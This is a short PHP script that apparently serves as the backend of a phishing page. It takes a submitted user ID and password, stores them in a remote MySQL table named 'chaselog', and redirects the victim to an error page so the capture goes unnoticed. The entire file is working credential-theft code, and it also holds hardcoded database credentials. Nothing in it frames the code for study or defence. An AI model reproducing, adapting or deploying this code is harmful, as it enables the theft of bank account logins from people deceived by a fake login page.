<?php
$server = "sql10.freemysqlhosting.net";
$user = "sql10334343";
$pass = "KxXrhmwsUv";
$dbname = "sql10334343";
 
//Creating connection for mysqli
 
$conn = new mysqli($server, $user, $pass, $dbname);
 
//Checking connection
 
if($conn->connect_error){
 die("Connection failed:" . $conn->connect_error);
}
 
$userid = mysqli_real_escape_string($conn, $_POST['userid']);
$pass = mysqli_real_escape_string($conn, $_POST['pass']);
 
$sql = "INSERT INTO chaselog (userid,pass) VALUES ('$userid','$pass')";
 
if($conn->query($sql) === TRUE){
 header("Location: errorpage.html");
}
else
{
 echo "Error" . $sql . "<br/>" . $conn->error;
}
$conn->close();
?>